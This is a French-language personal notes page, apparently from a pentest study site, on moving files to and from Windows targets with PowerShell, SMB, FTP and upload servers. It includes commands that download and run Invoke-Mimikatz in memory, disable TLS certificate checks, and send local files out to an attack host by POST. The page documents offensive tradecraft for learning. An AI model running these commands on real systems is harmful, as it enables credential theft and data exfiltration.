@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Le transfert de fichier - Mes docs en vrac ( et en cours )</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../..">Mes docs en vrac ( et en cours )</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../.." class="nav-link">Home</a>
+                            </li>
+                            <li class="dropdown active">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Hack <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../nmap/" class="dropdown-item">NMAP</a>
+</li>
+                                    
+<li>
+    <a href="../telnet/" class="dropdown-item">telnet</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active">Le transfert de fichier</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">IOS <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../IOS/commande_ios/" class="dropdown-item">Commande ios</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Python3 <b class="caret"></b></a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../Python3/python/" class="dropdown-item">python</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../telnet/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../../IOS/commande_ios/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#le-transfert-de-fichier" class="nav-link">Le transfert de fichier</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#powershell-base64-decode-encode" class="nav-link">Powershell base64 décode encode</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargements-web-powershell" class="nav-link">Téléchargements Web PowerShell</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargements-smb" class="nav-link">Téléchargements SMB</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargements-ftp" class="nav-link">Téléchargements FTP</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#hash" class="nav-link">Hash</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargements-web-powershell_1" class="nav-link">Téléchargements Web PowerShell</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargement-web-powershell-base64" class="nav-link">Téléchargement Web PowerShell Base64</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargements-smb_1" class="nav-link">Téléchargements SMB</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#telechargements-ftp_1" class="nav-link">Téléchargements FTP</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="le-transfert-de-fichier">Le transfert de fichier</h1>
+<h2 id="powershell-base64-decode-encode">Powershell base64 décode encode</h2>
+<p>Check de la clé ssh en hash md5</p>
+<pre><code class="language-sh">admin@pc[/pc]$ md5sum id_rsa
+
+4e301756a07ded0a2dd6953abf015278  id_rsa
+</code></pre>
+<p>Encodage de la clé en base64</p>
+<pre><code class="language-sh">&gt;admin@pc[/pc]$ cat id_rsa |base64 -w 0;echo
+&gt;
+&gt;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
+</code></pre>
+<p>Nous pouvons copier ce contenu et le coller dans une borne Windows PowerShell et utiliser certaines fonctions PowerShell pour le décoder.</p>
+<pre><code class="language-powershell">&gt;PS C:\pc&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
+</code></pre>
+<p>Enfin, nous pouvons confirmer si le fichier a été transféré avec succès à l'aide du Get-FileHash cmdlet, qui fait la même chose que md5sum fait.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+
+Algorithm       Hash                            Path
+---------       ----                            ----
+MD5      4E301756A07DED0A2DD6953ABF015278        C:\Users\Public\id_rsa
+</code></pre>
+<h2 id="telechargements-web-powershell">Téléchargements Web PowerShell</h2>
+<p>PowerShell propose de nombreuses options de transfert de fichiers.</p>
+<p>Dans n'importe quelle version de PowerShell, le <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a> peut être utilisée pour télécharger un fichier sur HTTP, HTTPS ou FTP. Les éléments suivants décrivent les méthodes WebClient pour télécharger des données à partir d'une ressource:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OpenRead</td>
+<td>Renvoie les données d'une ressource en tant que Flux.</td>
+</tr>
+<tr>
+<td>OpenReadAsync</td>
+<td>Renvoie les données d'une ressource sans bloquer le thread appelant.</td>
+</tr>
+<tr>
+<td>DownloadData</td>
+<td>Télécharge les données d'une ressource et renvoie un tableau d'octets.</td>
+</tr>
+<tr>
+<td>DownloadDataAsync</td>
+<td>Télécharge les données d'une ressource et renvoie un tableau d'octets sans bloquer le thread appelant.</td>
+</tr>
+<tr>
+<td>DownloadFile</td>
+<td>Télécharge les données d'une ressource vers un fichier local.</td>
+</tr>
+<tr>
+<td>DownloadFileAsync</td>
+<td>Télécharge les données d'une ressource vers un fichier local sans bloquer le thread appelant.</td>
+</tr>
+<tr>
+<td>DownloadString</td>
+<td>Télécharge une chaîne à partir d'une ressource et renvoie une chaîne.</td>
+</tr>
+<tr>
+<td>DownloadStringAsync</td>
+<td>Télécharge une chaîne à partir d'une ressource sans bloquer le fil appelant.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="methode-powershell-downloadfile">Méthode PowerShell DownloadFile</h3>
+<p>Nous pouvons spécifier le nom de la classe Net.WebClient et la méthode DownloadFile avec les paramètres correspondant à l'URL du fichier cible à télécharger et le nom du fichier de sortie.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')
+PS C:\pc&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+PS C:\pc&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')
+PS C:\pc&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
+</code></pre>
+<h3 id="powershell-downloadstring-methode-sans-fichier">PowerShell DownloadString - Méthode sans fichier</h3>
+<p>Comme nous l'avons vu précédemment, les attaques sans fichier fonctionnent en utilisant certaines fonctions du système d'exploitation pour télécharger la charge utile et l'exécuter directement. </p>
+<p>PowerShell peut également être utilisé pour effectuer des attaques sans fichier. </p>
+<p>Au lieu de télécharger un script PowerShell sur disque, nous pouvons l'exécuter directement en mémoire à l'aide du Invoke-Expression cmdlet ou l'alias IEX.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+</code></pre>
+<p>IEX accepte également les entrées de pipeline.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+</code></pre>
+<h3 id="powershell-invoke-webrequest">PowerShell Invoke-WebRequest</h3>
+<p>À partir de PowerShell 3.0, le Invoke-WebRequest cmdlet est également disponible, mais il est nettement plus lent à télécharger des fichiers. </p>
+<p>Vous pouvez utiliser les alias iwr, curl, et wget au lieu de la Invoke-WebRequest nom complet.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+</code></pre>
+<p>https://gist.github.com/HarmJ0y/bb48307ffa663256e239</p>
+<h3 id="erreurs-courantes-avec-powershell">Erreurs courantes avec PowerShell</h3>
+<p>Il peut y avoir des cas où la configuration du premier lancement d'Internet Explorer n'est pas terminée, ce qui empêche le téléchargement.</p>
+<p><img alt="" src="./capture/1.PNG" /></p>
+<p>Cela peut être contourné à l'aide du paramètre -UseBasicParsing.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX
+
+Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
++ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\pc&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX
+</code></pre>
+<p>Une autre erreur dans les téléchargements PowerShell est liée au canal sécurisé SSL / TLS si le certificat n'est pas fiable. Nous pouvons contourner cette erreur avec la commande suivante:</p>
+<pre><code class="language-powershell">PS C:\pc&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+Exception calling &quot;DownloadString&quot; with &quot;1&quot; argument(s): &quot;The underlying connection was closed: Could not establish trust
+relationship for the SSL/TLS secure channel.&quot;
+At line:1 char:1
++ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+PS C:\pc&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+</code></pre>
+<h2 id="telechargements-smb">Téléchargements SMB</h2>
+<p>Le protocole SMB qui s'exécute sur le port TCP / 445 est courant dans les réseaux d'entreprise où les services Windows s'exécutent. </p>
+<p>Il permet aux applications et aux utilisateurs de transférer des fichiers vers et depuis des serveurs distants.</p>
+<p>Nous pouvons utiliser SMB pour télécharger facilement des fichiers depuis notre Pwnbox. </p>
+<p>Nous devons créer un serveur SMB dans notre Pwnbox avec smbserver.py de Impacket puis utiliser copy, move, PowerShell Copy-Item, ou tout autre outil permettant la connexion à SMB.</p>
+<h3 id="creer-le-serveur-smb">Créer le serveur SMB</h3>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+<h3 id="copiez-un-fichier-a-partir-du-serveur-smb">Copiez un fichier à partir du serveur SMB</h3>
+<pre><code class="language-powershell">C:\pc&gt; copy \\192.168.220.133\share\nc.exe
+
+        1 file(s) copied.
+</code></pre>
+<p>Les nouvelles versions de Windows bloquent l'accès non authentifié des invités, comme nous pouvons le voir dans la commande suivante:</p>
+<pre><code class="language-powershell">C:\pc&gt; copy \\192.168.220.133\share\nc.exe
+
+You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+</code></pre>
+<h3 id="creez-le-serveur-smb-avec-un-nom-dutilisateur-et-un-mot-de-passe">Créez le serveur SMB avec un nom d'utilisateur et un mot de passe</h3>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre>
+<h3 id="monter-le-serveur-smb-avec-nom-dutilisateur-et-mot-de-passe">Monter le serveur SMB avec nom d'utilisateur et mot de passe</h3>
+<pre><code class="language-powershell">C:\pc&gt; net use n: \\192.168.220.133\share /user:test test
+
+The command completed successfully.
+
+C:\pc&gt; copy n:\nc.exe
+        1 file(s) copied.
+</code></pre>
+<p>Remarque: Vous pouvez également monter le serveur SMB si vous recevez une erreur lorsque vous utilisez <code>copy filename \\ IP \ sharename</code>.</p>
+<h2 id="telechargements-ftp">Téléchargements FTP</h2>
+<p>Une autre façon de transférer des fichiers consiste à utiliser FTP ( File Transfer Protocol ), qui utilise le port TCP / 21 et TCP / 20.</p>
+<p>Nous pouvons utiliser le client FTP ou PowerShell Net.WebClient pour télécharger des fichiers à partir d'un serveur FTP.</p>
+<p>Nous pouvons configurer un serveur FTP dans notre hôte d'attaque à l'aide de Python3 pyftpdlib module. </p>
+<p>Il peut être installé avec la commande suivante:</p>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo pip3 install pyftpdlib
+</code></pre>
+<p>Ensuite, nous pouvons spécifier le port numéro 21 car, par défaut, pyftpdlib utilise le port 2121. </p>
+<p>L'authentification anonyme est activée par défaut si nous ne définissons pas d'utilisateur et de mot de passe.</p>
+<h3 id="configuration-dun-serveur-ftp-python3">Configuration d'un serveur FTP Python3</h3>
+<pre><code class="language-sh">admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21
+
+[I 2022-05-17 10:09:19] concurrency model: async
+[I 2022-05-17 10:09:19] masquerade (NAT) address: None
+[I 2022-05-17 10:09:19] passive ports: None
+[I 2022-05-17 10:09:19] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=3210 &lt;&lt;&lt;
+</code></pre>
+<h3 id="transferer-des-fichiers-a-partir-dun-serveur-ftp-a-laide-de-powershell">Transférer des fichiers à partir d'un serveur FTP à l'aide de PowerShell</h3>
+<pre><code class="language-powershell">PS C:\pc&gt; (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
+</code></pre>
+<p>Lorsque nous obtenons un shell sur une machine distante, nous n'avons peut-être pas de shell interactif.</p>
+<p>Si tel est le cas, nous pouvons créer un fichier de commande FTP pour télécharger un fichier. </p>
+<p>Tout d'abord, nous devons créer un fichier contenant les commandes que nous voulons exécuter, puis utiliser le client FTP pour utiliser ce fichier pour télécharger ce fichier.</p>
+<h3 id="creer-un-fichier-de-commande-pour-le-client-ftp-et-telecharger-le-fichier-cible">Créer un fichier de commande pour le client FTP et télécharger le fichier cible</h3>
+<pre><code class="language-powershell">C:\pc&gt; echo open 192.168.49.128 &gt; ftpcommand.txt
+C:\pc&gt; echo USER anonymous &gt;&gt; ftpcommand.txt
+C:\pc&gt; echo binary &gt;&gt; ftpcommand.txt
+C:\pc&gt; echo GET file.txt &gt;&gt; ftpcommand.txt
+C:\pc&gt; echo bye &gt;&gt; ftpcommand.txt
+C:\pc&gt; ftp -v -n -s:ftpcommand.txt
+ftp&gt; open 192.168.49.128
+Log in with USER and PASS first.
+ftp&gt; USER anonymous
+
+ftp&gt; GET file.txt
+ftp&gt; bye
+
+C:\pc&gt;more file.txt
+This is a test file
+</code></pre>
+<p>Il existe également des situations telles que la fissuration par mot de passe, l'analyse, l'exfiltration, etc., où nous devons télécharger des fichiers de notre machine cible dans notre hôte d'attaque. </p>
+<p>Nous pouvons utiliser les mêmes méthodes que nous avons utilisées précédement.</p>
+<p>Voyons comment nous pouvons effectuer le téléchargement de fichiers de différentes manières.</p>
+<p>## PowerShell Base64 Encode &amp; Decode</p>
+<p>### Encoder le fichier à l'aide de PowerShell</p>
+<p>````powershell
+ PS C:\pc&gt; [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))</p>
+<p>IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
+PS C:\pc&gt; Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash</p>
+<h2 id="hash">Hash</h2>
+<p>3688374325B992DEF12793500307566D</p>
+<pre><code>
+Nous copions ce contenu et le collons dans notre hôte d'attaque, utilisons la commande base64 pour le décoder et utiliser le md5sum application pour confirmer le transfert s'est déroulé correctement.
+
+### Decode Base64 String sous Linux
+
+````sh
+admin@pc[/pc]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d &gt; hosts
+</code></pre>
+<pre><code class="language-sh">admin@pc[/pc]$ md5sum hosts 
+
+3688374325b992def12793500307566d  hosts
+</code></pre>
+<h2 id="telechargements-web-powershell_1">Téléchargements Web PowerShell</h2>
+<p>PowerShell n'a pas de fonction intégrée pour les opérations de téléchargement, mais nous pouvons utiliser Invoke-WebRequest ou Invoke-RestMethod pour construire notre fonction de téléchargement. Nous aurons également besoin d'un serveur Web qui accepte les téléchargements, ce qui n'est pas une option par défaut dans la plupart des utilitaires de serveur Web courants.</p>
+<p>Pour notre serveur Web, nous pouvons utiliser <a href="https://github.com/Densaugeo/uploadserver">serveur de telechargement</a>, un module étendu du Python <a href="https://docs.python.org/3/library/http.server.html">http.Server</a>, qui comprend une page de téléchargement de fichiers. Installons-le et démarrons le serveur Web.</p>
+<h3 id="installation-dun-serveur-web-configure-avec-telechargement">Installation d'un serveur Web configuré avec téléchargement</h3>
+<pre><code class="language-sh">admin@pc[/pc]$ pip3 install uploadserver
+
+Collecting upload server
+  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
+Installing collected packages: uploadserver
+Successfully installed uploadserver-2.0.1
+</code></pre>
+<pre><code class="language-sh">admin@pc[/pc]$ python3 -m uploadserver
+
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+<p>Nous pouvons maintenant utiliser un script PowerShell PSUpload.ps1 qui utilise Invoke-WebRequest pour effectuer les opérations de téléchargement. </p>
+<p>Le script accepte deux paramètres -File, que nous utilisons pour spécifier le chemin de fichier, et -Uri, l'URL du serveur où nous téléchargerons notre fichier.</p>
+<p>Essayons de télécharger le fichier hôte à partir de notre hôte Windows.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\pc&gt; Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+
+[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
+[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
+</code></pre>
+<h2 id="telechargement-web-powershell-base64">Téléchargement Web PowerShell Base64</h2>
+<p>Une autre façon d'utiliser les fichiers codés PowerShell et base64 pour les opérations de téléchargement consiste à utiliser Invoke-WebRequest ou Invoke-RestMethod avec Netcat. </p>
+<p>Nous utilisons Netcat pour écouter sur un port que nous spécifions et envoyer le fichier en tant que demande POST. </p>
+<p>Enfin, nous copions la sortie et utilisons la fonction de décodage base64 pour convertir la chaîne base64 en fichier.</p>
+<pre><code class="language-powershell">PS C:\pc&gt; $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\pc&gt; Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+</code></pre>
+<p>Nous capturons les données base64 avec Netcat et utilisons l'application base64 avec l'option de décodage pour convertir la chaîne en fichier.</p>
+<pre><code class="language-sh">admin@pc[/pc]$ nc -lvnp 8000
+
+listening on [any] 8000 ...
+connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
+POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.49.128:8000
+Content-Length: 1820
+Connection: Keep-Alive
+
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
+...SNIP...
+</code></pre>
+<pre><code class="language-sh">admin@pc[/pc]$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts
+</code></pre>
+<h2 id="telechargements-smb_1">Téléchargements SMB</h2>
+<p>Nous avons précédemment vu que les entreprises autorisent souvent le trafic sortant à l'aide des protocoles HTTP ( TCP / 80 ) et HTTPS ( TCP / 443 ). </p>
+<p>Généralement, les entreprises n'autorisent pas le protocole SMB ( TCP / 445 ) hors de leur réseau interne, car cela peut les ouvrir à des attaques potentielles. </p>
+<p>Pour plus d'informations à ce sujet, nous pouvons lire la publication Microsoft <a href="https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a">Empêcher le trafic SMB des connexions latérales et entrer ou quitter le réseau</a>.</p>
+<p>Une alternative consiste à exécuter SMB sur HTTP avec WebDav.</p>
+<p>WebDAV ( RFC 4918 ) est une extension de HTTP, le protocole Internet que les navigateurs Web et les serveurs Web utilisent pour communiquer entre eux. </p>
+<p>Le protocole WebDAV permet à un serveur Web de se comporter comme un serveur de fichiers, prenant en charge la création de contenu collaboratif. </p>
+<p>WebDAV peut également utiliser HTTPS.</p>
+<p>Lorsque vous utilisez SMB, il tentera d'abord de se connecter à l'aide du protocole SMB, et s'il n'y a pas de part SMB disponible, il essaiera de se connecter à l'aide du protocole HTTP. </p>
+<p>Dans la capture de Wireshark suivante, nous essayons de nous connecter au partage de fichiers testing3, et parce qu'il n'a rien trouvé avec SMB, il utilise HTTP.</p>
